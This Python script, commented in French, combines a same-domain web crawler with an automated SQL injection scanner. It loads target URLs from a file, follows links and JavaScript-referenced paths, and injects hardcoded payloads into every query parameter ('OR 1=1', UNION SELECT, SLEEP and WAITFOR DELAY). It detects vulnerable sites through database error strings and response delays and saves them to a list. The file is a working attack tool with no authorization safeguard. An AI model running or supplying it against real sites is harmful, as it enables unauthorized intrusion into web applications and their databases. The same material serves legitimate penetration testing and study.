#!/usr/bin/env python3
"""
Katana-style Crawler + SQLi Scanner - VERSION CORRIGÉE
- Accepte -cs pour filtrer les URLs à CRAWLER
- Ne filtre PAS l'URL de départ
- Parse le JS avec -jc
- Scanne toutes les URLs trouvées pour SQLi
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import argparse
from datetime import datetime
import sys
from typing import Set, List, Dict, Any  # Dict est maintenant importé

init(autoreset=True)

class SQLiScanner:
    def __init__(self, timeout=10, delay=0.5):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        self.payloads = [
            ("1' OR '1'='1", "error_based"),
            ("1\" OR \"1\"=\"1", "error_based"),
            ("' OR 1=1--", "error_based"),
            ("1' AND '1'='1", "boolean_true"),
            ("1' AND '1'='2", "boolean_false"),
            ("' UNION SELECT NULL--", "union"),
            ("' UNION SELECT NULL,NULL--", "union"),
            ("' OR SLEEP(3)--", "time_based"),
            ("1' AND SLEEP(3)--", "time_based"),
            ("'; WAITFOR DELAY '00:00:03'--", "time_based"),
        ]
        
        self.error_patterns = [
            r"sql.*error|mysql_fetch|sqlite|postgresql|oracle",
            r"unclosed quotation mark|syntax error.*sql",
            r"warning:.*mysql|driver.*database",
            r"you have an error in your sql",
        ]
        
        self.vulnerabilities_found = []

    def url_has_parameters(self, url: str) -> bool:
        """Vérifie si l'URL a des paramètres à tester"""
        parsed = urlparse(url)
        return bool(parsed.query)

    def test_single_url(self, url: str) -> Dict:
        """Teste une URL pour SQLi"""
        if not self.url_has_parameters(url):
            return {'url': url, 'vulnerable': False, 'reason': 'no_params'}
        
        print(f"{Fore.YELLOW}[→] Test SQLi: {url}")
        
        parsed = urlparse(url)
        original_params = parse_qs(parsed.query)
        vulnerabilities = []
        
        for param_name in original_params.keys():
            for payload, payload_type in self.payloads:
                try:
                    # Créer URL avec payload
                    new_params = original_params.copy()
                    new_params[param_name] = [payload]
                    new_query = urlencode(new_params, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()
                    
                    # Time-based detection
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    # Error-based detection
                    content = response.text.lower()
                    for pattern in self.error_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            vuln = {
                                'url': url,
                                'vulnerable_url': test_url,
                                'param': param_name,
                                'payload': payload,
                                'type': 'error_based',
                                'evidence': pattern
                            }
                            vulnerabilities.append(vuln)
                            self.vulnerabilities_found.append(vuln)
                            print(f"{Fore.RED}[!] SQLi trouvée: {test_url}")
                            break
                    
                    # Time-based detection
                    if payload_type == 'time_based' and response_time > 2.5:
                        vuln = {
                            'url': url,
                            'vulnerable_url': test_url,
                            'param': param_name,
                            'payload': payload,
                            'type': 'time_based',
                            'response_time': round(response_time, 2)
                        }
                        vulnerabilities.append(vuln)
                        self.vulnerabilities_found.append(vuln)
                        print(f"{Fore.RED}[!] SQLi Time-based: {test_url}")
                    
                    time.sleep(self.delay)
                    
                except Exception:
                    continue
        
        return {
            'url': url,
            'vulnerable': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities
        }

class KatanaCrawler:
    def __init__(self, urls_file: str, max_depth: int = 2, concurrency: int = 5,
                 crawl_scope: str = None, js_crawl: bool = False):
        self.urls_file = urls_file
        self.max_depth = max_depth
        self.concurrency = concurrency
        self.crawl_scope = crawl_scope
        self.js_crawl = js_crawl
        
        self.visited: Set[str] = set()
        self.urls_to_scan: List[Dict] = []
        self.all_discovered: List[str] = []
        self.sql_results: List[Dict] = []
        
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        self.scanner = SQLiScanner()
        
        # Compiler la regex de scope
        self.scope_pattern = None
        if self.crawl_scope:
            try:
                self.scope_pattern = re.compile(self.crawl_scope)
                print(f"{Fore.GREEN}[✓] Filtre de crawl: {self.crawl_scope}")
            except re.error:
                print(f"{Fore.RED}[✗] Regex invalide: {self.crawl_scope}")
                sys.exit(1)

    def should_follow_link(self, url: str) -> bool:
        """
        Décide si on DOIT CRAWLER cette URL (pour -cs)
        L'URL de départ est toujours crawlee, les liens sont filtrés
        """
        if not self.scope_pattern:
            return True
        # L'URL correspond à la regex ? (ex: contient id=, page=, etc.)
        return bool(self.scope_pattern.search(url))

    def extract_links_from_js(self, js_url: str, base_domain: str) -> List[str]:
        """Extrait les URLs d'un fichier JavaScript"""
        links = []
        try:
            response = self.session.get(js_url, timeout=5)
            # Chercher des patterns d'URLs dans le JS
            patterns = [
                r'["\'](https?://[^"\']+)["\']',
                r'["\'](/[^"\']+)["\']',
                r'url\(["\']?([^"\')]+)["\']?\)',
                r'fetch\(["\']([^"\']+)["\']',
                r'ajax\(["\']([^"\']+)["\']',
            ]
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    full_url = urljoin(js_url, match)
                    if urlparse(full_url).netloc == base_domain:
                        links.append(full_url)
        except Exception:
            pass
        return links

    def load_target_urls(self) -> List[str]:
        """Charge les URLs depuis le fichier"""
        try:
            with open(self.urls_file, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[✓] {len(urls)} URLs chargées")
            return urls
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur: {e}")
            return []

    def crawl_site(self, url: str, current_depth: int = 0):
        """Crawle un site à partir d'une URL de départ"""
        if url in self.visited or current_depth > self.max_depth:
            return
        
        # Normaliser l'URL
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        print(f"{Fore.CYAN}[*] Crawl [{current_depth}/{self.max_depth}]: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            self.visited.add(url)
            self.all_discovered.append(url)
            
            # Si l'URL a des paramètres, on la marque pour scan SQLi
            if self.scanner.url_has_parameters(url):
                self.urls_to_scan.append({'url': url, 'depth': current_depth})
                print(f"{Fore.GREEN}[+] À scanner: {url}")
            
            # Extraire les liens pour continuer le crawl (si pas trop profond)
            if current_depth < self.max_depth:
                soup = BeautifulSoup(response.text, 'html.parser')
                base_domain = urlparse(url).netloc
                links_found = 0
                
                # Liens standards <a href>
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    # Ne garder que le même domaine
                    if urlparse(full_url).netloc == base_domain:
                        # Appliquer le filtre -cs uniquement pour les liens à suivre
                        if self.should_follow_link(full_url):
                            if full_url not in self.visited:
                                links_found += 1
                                self.crawl_site(full_url, current_depth + 1)
                        else:
                            print(f"{Fore.BLUE}[-] Ignoré (hors scope): {full_url}")
                
                # Parsing JavaScript si activé
                if self.js_crawl:
                    for script in soup.find_all('script', src=True):
                        js_url = urljoin(url, script['src'])
                        if urlparse(js_url).netloc == base_domain:
                            js_links = self.extract_links_from_js(js_url, base_domain)
                            for js_link in js_links:
                                if self.should_follow_link(js_link) and js_link not in self.visited:
                                    self.crawl_site(js_link, current_depth + 1)
                
                print(f"{Fore.CYAN}   → {links_found} nouveaux liens trouvés")
                            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Erreur: {str(e)[:50]}")

    def scan_urls_for_sqli(self):
        """Scanne les URLs collectées"""
        if not self.urls_to_scan:
            print(f"{Fore.YELLOW}[!] Aucune URL à scanner")
            return
        
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f" Scan SQLi sur {len(self.urls_to_scan)} URLs")
        print(f"{'='*60}")
        
        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = {
                executor.submit(self.scanner.test_single_url, item['url']): item 
                for item in self.urls_to_scan
            }
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result.get('vulnerable'):
                        self.sql_results.extend(result.get('vulnerabilities', []))
                except Exception as e:
                    print(f"{Fore.RED}[✗] Erreur scan: {e}")

    def run(self):
        """Exécute le crawl puis le scan"""
        start_urls = self.load_target_urls()
        if not start_urls:
            return
        
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(" Phase 1: Crawling des sites")
        print(f"{'='*60}")
        
        for url in start_urls:
            print(f"\n{Fore.CYAN}--- Départ: {url} ---")
            self.crawl_site(url)
        
        if self.urls_to_scan:
            self.scan_urls_for_sqli()
        
        self.save_results()

    def save_results(self, output_file: str = "results.json"):
        """Sauvegarde les résultats"""
        # Compter les URLs avec paramètres
        urls_with_params = [u for u in self.all_discovered if '?' in u and '=' in u]
        
        data = {
            'scan_info': {
                'date': datetime.now().isoformat(),
                'filtre_cs': self.crawl_scope,
                'js_crawl': self.js_crawl,
                'urls_depart': len(self.load_target_urls()),
                'urls_decouvertes': len(self.all_discovered),
                'urls_avec_parametres': len(urls_with_params),
                'urls_scannees': len(self.urls_to_scan),
                'vulns_trouvees': len(self.sql_results)
            },
            'urls_decouvertes': self.all_discovered,
            'urls_avec_parametres': urls_with_params,
            'urls_scannees': self.urls_to_scan,
            'vulnerabilites': self.sql_results
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        
        # Fichier texte avec juste les URLs vulnérables
        if self.sql_results:
            with open("vulnerable_urls.txt", 'w', encoding='utf-8') as f:
                for v in self.sql_results:
                    f.write(f"{v.get('vulnerable_url', v['url'])}\n")
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(" RÉSULTATS FINAUX")
        print(f"{'='*60}")
        print(f"URLs découvertes: {len(self.all_discovered)}")
        print(f"URLs avec paramètres: {len(urls_with_params)}")
        print(f"URLs scannées: {len(self.urls_to_scan)}")
        print(f"Vulnérabilités trouvées: {len(self.sql_results)}")
        print(f"{'='*60}")
        print(f"Rapport: {output_file}")
        if self.sql_results:
            print(f"URLs vulnérables: vulnerable_urls.txt")
        print(f"{'='*60}")

def main():
    parser = argparse.ArgumentParser(description='Katana crawler + SQLi scanner')
    parser.add_argument('-l', '--list', required=True, help='Fichier URLs de départ')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Profondeur max (défaut: 2)')
    parser.add_argument('-c', '--concurrency', type=int, default=5, help='Concurrence (défaut: 5)')
    parser.add_argument('-o', '--output', default='results.json', help='Fichier sortie')
    parser.add_argument('-cs', '--crawl-scope', help='Regex pour filtrer les URLs à CRAWLER (ex: "id=")')
    parser.add_argument('-jc', '--js-crawl', action='store_true', help='Parser les fichiers JS')
    
    args = parser.parse_args()
    
    print(f"{Fore.MAGENTA}{'='*60}")
    print(" Katana-style Crawler + SQLi Scanner (v2 corrigée)")
    print(f"{'='*60}")
    
    crawler = KatanaCrawler(
        urls_file=args.list,
        max_depth=args.depth,
        concurrency=args.concurrency,
        crawl_scope=args.crawl_scope,
        js_crawl=args.js_crawl
    )
    
    try:
        crawler.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompu")
        crawler.save_results(args.output)
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {e}")

if __name__ == "__main__":
    main()